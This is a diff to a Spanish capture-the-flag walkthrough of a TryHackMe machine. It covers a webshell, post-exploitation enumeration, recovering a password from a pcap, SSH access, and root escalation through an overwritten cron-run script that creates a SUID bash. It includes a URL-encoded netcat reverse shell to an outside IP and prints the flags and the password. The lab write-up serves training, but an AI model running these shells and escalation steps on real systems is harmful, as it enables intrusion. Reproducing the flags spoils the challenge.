@@ -202,6 +202,8 @@ Resultado relevante:
 /files (Status: 301)
 ```
 
+![gobuster](imagenes/gobuster.png)
+
 Esto indica que existe un directorio accesible llamado /files.
 
 
@@ -214,6 +216,7 @@ http://10.130.144.165/files/
 ```
 Se confirma que es un directorio expuesto públicamente.
 
+![files](imagenes/files.png)
 
 ### 5.3 Relación FTP → Web 
 
@@ -243,6 +246,8 @@ Para verificar que la webshell funciona correctamente, se ejecuta un comando bá
 http://10.130.144.165/files/ftp/shell.php?cmd=id
 ```
 
+![shell](imagenes/shell.png)
+
 Si la explotación es correcta, la respuesta del servidor será similar a:
 
 ```bash
@@ -268,6 +273,7 @@ En la máquina atacante:
 ```bash
 nc -lvnp 4444
 ```
+![nc](imagenes/nc.png)
 
 ### 7.2 Ejecutar reverse shell desde la webshell
 
@@ -276,6 +282,7 @@ Se utiliza la webshell para lanzar una conexión inversa:
 ```bash
 http://10.130.144.165/files/ftp/shell.php?cmd=rm%20/tmp/f%3Bmkfifo%20/tmp/f%3Bcat%20/tmp/f%7C/bin/sh%20-i%202%3E%261%7Cnc%20192.168.142.53%204444%20%3E/tmp/f
 ```
+![nano](imagenes/nc2.png)
 
 Sustituir la IP por la de tun0 si es necesario.
 
@@ -290,3 +297,257 @@ connect to [192.168.142.53] from 10.130.144.165
 $
 ```
 
+## 8. Enumeración local (post-explotación)
+
+Una vez obtenida la reverse shell como www-data, se procede a la enumeración del sistema para identificar posibles vectores de escalada de privilegios.
+
+### 8.1 Identificación del usuario actual
+
+```bash
+whoami
+id
+```
+
+Resultado esperado:
+
+```bash
+www-data
+uid=33(www-data)
+```
+
+### 8.2 Exploración del sistema de archivos
+
+Se revisan los directorios principales del sistema:
+
+```bash
+ls -la /
+ls -la /home
+```
+
+![nano](imagenes/ls.png)
+
+Se observa:
+
+Existe el usuario lennie
+- Se localiza el directorio /incidents
+- Se encuentra el archivo recipe.txt (ya analizado previamente)
+
+
+### 8.3 Archivo interesante en /incidents
+
+```bash
+ls -la /incidents
+```
+![nano](imagenes/incidents.png)
+
+Resultado:
+
+```bash
+suspicious.pcapng
+```
+
+Este archivo contiene tráfico de red que puede incluir credenciales o información sensible.
+
+
+### 8.4 Análisis del archivo pcap
+
+Para facilitar su análisis, se copia a un directorio accesible desde el servidor web:
+
+```bash
+cp /incidents/suspicious.pcapng /var/www/html/files/ftp/
+```
+
+Esto permite su descarga desde el navegador:
+
+```bash
+http://10.130.168.100/files/ftp/suspicious.pcapng
+```
+![nano](imagenes/pcapng.png)
+
+## 9. Análisis del tráfico con Wireshark
+
+Una vez descargado el archivo, se abre con Wireshark para su análisis.
+
+### 9.1 Inspección de tráfico
+
+Se aplica filtro:
+
+```bash
+tcp.stream eq 7
+```
+
+![tcp](imagenes/tcp.png)
+
+Posteriormente se revisan conexiones con:
+
+```bash
+Follow → TCP Stream
+```
+
+### 9.2 Descubrimiento de credenciales
+
+Dentro de los flujos TCP se identifica tráfico en texto claro donde aparece una credencial.
+
+Se obtiene la siguiente contraseña:
+
+```bash
+c4ntg3t3n0ughsp1c3
+```
+![lennie](imagenes/lennie.png)
+
+## 10. Acceso por SSH
+
+Con las credenciales obtenidas, se accede al sistema mediante SSH:
+
+```bash
+ssh lennie@10.130.168.100
+```
+
+Contraseña:
+
+```bash
+c4ntg3t3n0ughsp1c3
+```
+![ssh](imagenes/ssh.png)
+
+Resultado:
+
+Acceso exitoso como usuario lennie
+
+
+## 11. Enumeración como usuario lennie
+
+Una vez dentro, se revisan los archivos del usuario:
+
+```bash
+ls -la
+```
+
+Se encuentran:
+
+```bash
+user.txt
+directorio scripts
+directorio documents
+```
+
+Abrimos la primera flag que es user.txt y nos encontramos con la flag: 
+
+```bash
+cat user.txt
+```
+Resultado:
+
+```bash
+THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
+```
+
+![user](imagenes/user.png)
+
+
+### 11.1 Análisis del directorio scripts
+
+```bash
+cd /home/lennie/scripts
+ls -la
+```
+
+Archivos encontrados:
+
+```bash
+planner.sh
+startup_list.txt
+```
+
+### 11.2 Revisión del script principal
+
+```bash
+cat planner.sh
+```
+![user](imagenes/planner.png)
+
+Contenido:
+
+```bash
+#!/bin/bash
+echo $LIST > /home/lennie/scripts/startup_list.txt
+/etc/print.sh
+```
+
+### 11.3 Identificación del vector de escalada
+
+Se observa que el script ejecuta:
+
+```bash
+/etc/print.sh
+```
+Este archivo es el punto clave, ya que puede ser ejecutado con privilegios elevados o mediante automatización del sistema.
+
+
+### 11.4 Explotación del script
+
+Se modifica el archivo /etc/print.sh:
+
+```bash
+nano /etc/print.sh
+```
+
+Se reemplaza su contenido por:
+
+```bash
+#!/bin/bash
+cp /bin/bash /tmp/rootbash
+chmod u+s /tmp/rootbash
+```
+![user](imagenes/nano3.png)
+
+## 11.5 Asignación de permisos
+
+```bash
+chmod +x /etc/print.sh
+```
+
+## 12. Obtención de privilegios root
+
+Cuando el script es ejecutado automáticamente por el sistema, se genera un binario con permisos SUID.
+
+Finalmente, se obtiene acceso root:
+
+```bash
+/tmp/rootbash -p
+```
+
+![root](imagenes/root.png)
+
+Resultado:
+
+```bash
+root
+```
+
+## 13 Búsqueda de la flag
+
+En máquinas TryHackMe, la flag de root normalmente se encuentra en:
+
+```bash
+ /root
+```
+
+Por lo tanto, se lista el contenido del directorio:
+
+```bash
+ls -la /root
+```
+
+Se accede al archivo:
+
+```bash
+cat /root/root.txt
+```
+![root](imagenes/catroot.png)
+
+Obtenemos la flag:
+
+```bash
+THM{f963aaa6a430f210222158ae15c3d76d}
+```
